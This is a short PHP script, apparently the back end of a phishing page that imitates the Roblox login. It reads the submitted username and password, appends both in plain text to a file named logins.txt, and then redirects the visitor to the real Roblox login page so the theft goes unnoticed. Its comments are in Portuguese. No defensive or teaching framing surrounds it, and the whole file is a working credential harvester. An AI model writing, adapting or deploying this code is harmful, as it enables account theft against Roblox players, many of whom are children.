<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    // Salva os dados em um arquivo de texto
    $file = fopen("logins.txt", "a");
    fwrite($file, "User: " . $user . " | Pass: " . $pass . "\n\n");
    fclose($file);
    
    // Redireciona para o site real do Roblox
    header("Location: https://www.roblox.com/login");
}
?>
